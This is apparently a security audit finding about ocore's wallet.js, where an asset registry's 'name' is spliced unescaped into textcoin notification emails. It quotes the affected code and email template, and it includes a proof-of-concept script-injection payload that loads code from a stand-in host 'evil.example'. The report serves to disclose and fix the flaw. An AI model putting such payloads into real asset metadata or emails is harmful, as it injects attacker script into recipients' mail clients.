### Title
Unsanitized Asset-Registry `name`/`suffix` and Textcoin Parameters Injected Verbatim into HTML Email via Naive `{{...}}` Substitution - ([File: wallet.js])

### Summary
`fetchAssetMetadata()` in `wallet.js` stores an asset's `name` field straight from a `data` message authored by the asset's registry address, with no character/format restriction beyond “truthy”. `sendTextcoinEmail()`/`replaceInTextcoinTemplate()` then take that `asset` string (together with `amount` and `mnemonic`) and splice it into `email_template.html` using plain `String.replace()` on literal `{{key}}` placeholders, with **no HTML-escaping**. This is structurally the same bug class as CVE‑2018‑9113: attacker-controlled text that is expected to be inert data is spliced verbatim into a rendered document, allowing injection of markup/script that a downstream renderer (here, an HTML email client) will execute/render.

### Finding Description
- `fetchAssetMetadata()` reads the registry's `data` message and only checks `if (!payload.name) return handleMetadata(...)`; it performs no filtering of HTML-special characters and stores `payload.name` (and `suffix`, echoed back from the hub) into `asset_metadata.name` / `.suffix`. [1](#0-0) 
- `readAssetMetadata()` later exposes this unescaped `name` (optionally with `.suffix`) to callers as the asset's display name. [2](#0-1) 
- When a wallet owner sends a textcoin, `sendMultiPayment()` invokes `sendTextcoinEmail(email, opts.email_subject, objPayment.amount, objPayment.asset, objPayment.mnemonic)`, passing the asset identifier/name straight through. [3](#0-2) 
- `sendTextcoinEmail()` forwards `amount`, `asset`, `mnemonic` to the template renderer without any encoding. [4](#0-3) 
- `replaceInTextcoinTemplate()` performs a raw regex `String.replace()` of each `{{key}}` placeholder with the corresponding value, with no HTML entity escaping (`<`, `>`, `"`, `'`, `&` are all passed through unmodified) before writing the resulting `htmlBody`. [5](#0-4) 
- The template itself interpolates `{{amount}} {{asset}} {{usd_amount_str}}` and `{{mnemonic}}` directly inside HTML attribute and text contexts (including inside an `<a href="...">` URL and inside a hidden `<span>` preheader). [6](#0-5) 

Because `asset` here is exactly the registry-supplied display name (not a hash-validated field, and not restricted to a safe character set at the point it's inserted into the template), a malicious asset registry (or a compromised/malicious update to an "updatable" registry, see `isUpdatableRegistry()`) can set `name` to a string such as `"><script src=https://evil/x.js></script>` — mirroring the exact CVE‑2018‑9113 payload pattern (`'>&lt;script ...&gt;` breaking out of an attribute/tag context) — and it will flow unmodified into every textcoin notification email generated for that asset.

### Impact Explanation
This does not directly cause double-spend or fund loss inside the ocore consensus layer, but it is a genuine HTML/script injection into a message the wallet software sends to third parties (email recipients of textcoins) on behalf of the sending user, driven by attacker-controlled on-chain asset metadata. A malicious/compromised asset registry (an entity explicitly reachable per the DAG — issuing a `data` message under `app: data` naming/describing an asset) can weaponize every textcoin email sent for its asset to deliver injected markup/script to any email client that renders HTML without stripping unrecognized tags — a realistic scenario given many webmail/HTML clients render embedded remote-loaded content or clickable/spoofed links. This qualifies as a Medium/High-severity issue under the CVE's own classification of "code injection via crafted external content that is unsafely embedded into rendered output."

### Likelihood Explanation
Likelihood is moderate: it requires (1) an asset registry address to publish a `data` message with a malicious `name`, and (2) a wallet user to subsequently send a textcoin denominated in (or display-labeled with) that asset to an email recipient. Both are attacker-reachable without any special privilege — any address can author an asset and register itself/another address as its "registry," and any wallet user routinely triggers `sendMultiPayment` with email destinations for textcoins.

### Recommendation
- HTML-escape all substituted values (`amount`, `asset`, `usd_amount_str`, `mnemonic`) in `replaceInTextcoinTemplate()` before inserting them into `email_template.html` (escape `&`, `<`, `>`, `"`, `'`), and additionally URL-encode the value used inside the `href="https://obyte.org/#textcoin?{{mnemonic}}"` attribute.
- Constrain `asset_metadata.name` / `.suffix` at ingestion time in `fetchAssetMetadata()` to a restricted character set (e.g. alphanumeric plus a small punctuation whitelist, matching the existing `VARCHAR(20)` column) and reject/strip metadata names containing `<`, `>`, `"`, `'`, or control characters.
- Consider rendering the asset display name only after passing through a template-escaping helper regardless of source, so any future callers of `readAssetMetadata()` used in HTML contexts are protected by default.

### Proof of Concept
1. Attacker controls address `R` and publishes an `asset` definition plus, from the same address acting as `registry_address`, a `data` message: `{asset: "<ASSET_UNIT>", name: "\"><script src=https://evil.example/x.js></script>"}`.
2. A separate wallet user resolves this asset (e.g., receives it, or the attacker gets them to accept a payment in it), causing `fetchAssetMetadata()` to store the malicious `name` into `asset_metadata` with no sanitization. [7](#0-6) 
3. The wallet user later sends a textcoin denominated in that asset to an email address via `sendMultiPayment({..., asset: "<ASSET_UNIT>", to_address: "textcoin:victim@example.com", ...})`.
4. `sendTextcoinEmail()` is invoked with `asset = "\"><script src=https://evil.example/x.js></script>"`, and `replaceInTextcoinTemplate()` splices it unescaped into the HTML template, producing an email whose HTML body contains the injected `<script>` tag rendered by the recipient's mail client. [8](#0-7)

### Citations

**File:** wallet.js (L1374-1381)
```javascript
			var asset = row.asset || "base";
			assocAssetMetadata[asset] = {
				is_expired: is_expired,
				metadata_unit: row.metadata_unit,
				decimals: row.decimals,
				name: row.suffix ? row.name+'.'+row.suffix : row.name
			};
		}
```

**File:** wallet.js (L1458-1483)
```javascript
					objJoint.unit.messages.forEach(function(message){
						if (message.app !== 'data')
							return;
						var payload = message.payload;
						if (payload.asset !== asset)
							return;
						if (!payload.name)
							return handleMetadata("no name in asset metadata "+metadata_unit);
						var decimals = (payload.decimals !== undefined) ? parseInt(payload.decimals) : undefined;
						if (decimals !== undefined && !ValidationUtils.isNonnegativeInteger(decimals))
							return handleMetadata("bad decimals in asset metadata "+metadata_unit);
						var verb = isUpdatableRegistry(registry_address) ? "REPLACE" : "INSERT " + db.getIgnore();
						db.query(
							verb + " INTO asset_metadata (asset, metadata_unit, registry_address, suffix, name, decimals) \n\
							VALUES (?,?,?, ?,?,?)",
							[asset, metadata_unit, registry_address, suffix, payload.name, decimals],
							function(){
								var objMetadata = {
									metadata_unit: metadata_unit,
									suffix: suffix,
									decimals: decimals,
									name: payload.name
								};
								handleMetadata(null, objMetadata);
							}
						);
```

**File:** wallet.js (L2290-2296)
```javascript
						if (Object.keys(assocPaymentsByEmail).length) { // need to send emails
							var sent = 0;
							for (var email in assocPaymentsByEmail) {
								var objPayment = assocPaymentsByEmail[email];
								sendTextcoinEmail(email, opts.email_subject, objPayment.amount, objPayment.asset, objPayment.mnemonic);
								if (++sent == Object.keys(assocPaymentsByEmail).length)
									handleResult(null, objJoint.unit.unit, assocMnemonics, objJoint.unit);
```

**File:** wallet.js (L2605-2625)
```javascript
function sendTextcoinEmail(email, subject, amount, asset, mnemonic){
	var mail = require('./mail.js');
	var usd_amount_str = '';
	if (!asset){
		amount -= constants.TEXTCOIN_CLAIM_FEE;
		if (network.exchangeRates['GBYTE_USD']) {
			usd_amount_str = " (≈" + ((amount/1e9)*network.exchangeRates['GBYTE_USD']).toLocaleString([], {maximumFractionDigits: 2}) + " USD)";
		}
		amount = (amount/1e9).toLocaleString([], {maximumFractionDigits: 9});
		asset = 'GB';
	}
	replaceInTextcoinTemplate({amount: amount, asset: asset, mnemonic: mnemonic, usd_amount_str: usd_amount_str}, function(html, text){
		mail.sendmail({
			to: email,
			from: conf.from_email || "noreply@obyte.org",
			subject: subject || "Obyte user beamed you money",
			body: text,
			htmlBody: html
		});
	});
}
```

**File:** wallet.js (L2627-2641)
```javascript
function replaceInTextcoinTemplate(params, handleText){
	var fs = require('fs');
	fs.readFile(__dirname + '/email_template.html', 'utf8', function(err, template) {
		if (err)
			throw Error("failed to read template: "+err);
		_.forOwn(params, function(value, key){
			var re = new RegExp('\\{\\{' + key + '\\}\\}',"g");
			template = template.replace(re, value);
		});
		template = template.replace(/\{\{\w*\}\}/g, '');

		var text = "Here is your link to receive " + params.amount + " " + params.asset + params.usd_amount_str + ": https://obyte.org/#textcoin?" + params.mnemonic;
		handleText(template, text);
	});
}
```

**File:** email_template.html (L91-104)
```html
            <span class="preheader" style="color: transparent; display: none; height: 0; max-height: 0; max-width: 0; opacity: 0; overflow: hidden; mso-hide: all; visibility: hidden; width: 0;">Here is your link to receive {{amount}} {{asset}} {{usd_amount_str}}: https://obyte.org/#textcoin?{{mnemonic}}</span>
            <table class="main" style="border-collapse: separate; mso-table-lspace: 0pt; mso-table-rspace: 0pt; width: 100%; background: #ffffff; border-radius: 3px;">

              <!-- START MAIN CONTENT AREA -->
              <tr>
                <td class="wrapper" style="font-family: sans-serif; font-size: 14px; vertical-align: top; box-sizing: border-box; padding: 20px;">
                  <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: separate; mso-table-lspace: 0pt; mso-table-rspace: 0pt; width: 100%;">
                    <tr>
                      <td style="font-family: sans-serif; font-size: 14px; vertical-align: top;">
                        <p style="font-family: sans-serif; font-size: 14px; font-weight: normal; margin: 0; Margin-bottom: 15px;">Hello,</p>
                        <p style="font-family: sans-serif; font-size: 14px; font-weight: normal; margin: 0; Margin-bottom: 15px;">Here is your link to receive <b>{{amount}} {{asset}}</b> {{usd_amount_str}}:</p>
                        <p style="font-family: sans-serif; font-size: 14px; font-weight: normal; margin: 0; margin-left: 0px; Margin-bottom: 15px;">
                        	<a href="https://obyte.org/#textcoin?{{mnemonic}}">https://obyte.org/#textcoin?{{mnemonic}}</a>
                        </p>
```
